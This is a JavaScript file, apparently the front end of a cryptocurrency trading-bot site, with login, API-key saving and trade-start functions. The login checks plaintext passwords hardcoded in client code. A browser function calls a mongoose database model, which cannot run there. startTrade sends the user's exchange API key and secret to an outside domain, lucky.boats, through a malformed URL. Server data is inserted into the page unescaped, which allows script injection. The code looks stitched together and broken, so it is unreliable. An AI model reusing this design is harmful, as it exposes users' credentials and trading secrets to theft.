var users = [
    {username: "user1", password: "pass1"},
    {username: "user2", password: "pass2"},
    {username: "user3", password: "pass3"}
];

function login() {
    var username = $("#username").val();
    var password = $("#password").val();
    var isValid = false;
    for (var i = 0; i < users.length; i++) {
        if (username === users[i].username && password === users[i].password) {
            isValid = true;
            break;
        }
    }
    if (isValid) {
        // Redirect to the success page
        window.location.href = "success.html";
    } else {
        // Show an error message
        $("#message").text("Invalid username or password.");
    }
}

const apiKeySchema = new mongoose.Schema({
    platform: {
        type: String,
        required: true
    },
    api_key: {
        type: String,
        required: true
    },
    secret_key: {
        type: String,
        required: true
    }
});


const ApiKey = mongoose.model('ApiKey', apiKeySchema);



function saveKeys() {
    var platform = $("#platform").val();
    var api_key = $("#api_key").val();
    var secret_key = $("#secret_key").val();
    const apiKey = new ApiKey({
        platform: platform,
        api_key: api_key,
        secret_key: secret_key
    });
    apiKey.save((err) => {
        if (err) {
            $("#message").text("Error saving API keys to the database.");
        } else {
            $("#message").text("API keys have been saved to the database.");
        }
    });
}



function startTrade() {
    // Get the API key and secret from the input fields
    const apiKey = document.getElementById("api_key").value;
    const apiSecret = document.getElementById("api_secret").value;

    // Validate the API key and secret
    if (!apiKey || !apiSecret) {
        alert("Please enter a valid API key and secret.");
        return;
    }

    // Send a request to the server-side script to validate the API key and secret
    $.ajax({
        url: 'https//lucky.boats/validate',
        type: 'POST',
        data: { apiKey: apiKey, apiSecret: apiSecret },
        success: function(data) {
            // If the API key and secret are valid, redirect to the trading dashboard
            if (data.valid) {
                window.location.href = "trade.html";
            } else {
                alert("Invalid API key or secret. Please try again.");
            }
        },
        error: function(err) {
            console.log(err);
            alert("An error occurred. Please try again later.");
        }
    });
}

$(document).ready(function() {
    updateTradingActivity();
});

function updateTradingActivity() {
    $.ajax({
        url: 'https://yourdomain.com/tradingactivity',
        type: 'GET',
        success: function(data) {
            // Parse the JSON data received from the server
            let activity = JSON.parse(data);
            // Update the trading activity div with the data
            $("#trading_activity").html(
                "<p>Current Balance: " + activity.balance + "</p>" +
                "<p>Total Profit: " + activity.profit + "</p>" +
                "<p>Total Trades: " + activity.trades + "</p>" +
                "<p>Success Rate: " + activity.success_rate + "%</p>"
            );
        },
        error: function(err) {
            console.log(err);
            $("#trading_activity").html("<p>An error occurred. Please try again later.</p>");
        }
    });
}

